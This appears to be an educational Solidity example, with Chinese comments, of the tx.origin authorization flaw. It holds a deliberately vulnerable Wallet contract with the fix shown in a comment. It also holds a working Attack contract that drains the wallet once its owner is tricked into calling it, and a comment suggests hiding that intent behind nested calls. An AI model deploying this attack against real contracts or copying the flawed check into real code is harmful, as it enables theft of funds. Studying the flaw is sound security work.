// SPDX-License-Identifier: MIT pragma solidity ^0.8.13;

/*
@tx.origin不正确使用的漏洞
-   基本介绍
    Wallet是一个存在漏洞的合约，它的transfer函数只允许owner调用，然后将eth转给目标地址。但是它错误的通过tx.origin来检查caller是否owner。
    具体看下面的注释。
*/


// 这是受害者合约，先部署，并且注入ETH
contract Wallet {
    address public owner;
    constructor() payable {owner = msg.sender;}

    function transfer(address payable _to, uint _amount) public {
        // 这一行是bug代码
        require(tx.origin == owner, "Not owner");
        // 修复版本：要求Owner直接调用此函数，而不是间接调用
        // require(msg.sender == owner, "Not owner");

        (bool sent,) = _to.call{value : _amount}("");
        require(sent, "Failed to send Ether");
    }
}

// 这是攻击者合约
contract Attack {
    address payable public owner;
    Wallet wallet;

    // 部署时先将 受害者合约地址 写入合约变量
    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    // 再诱骗 受害者合约 的部署者调用这个函数，结果会将 受害者合约 的以太币转入 攻击者合约
    function attack() public {
        // 实际情况中，这里可能会有多层嵌套，以隐藏实际意图
        wallet.transfer(owner, address(wallet).balance);
    }
}

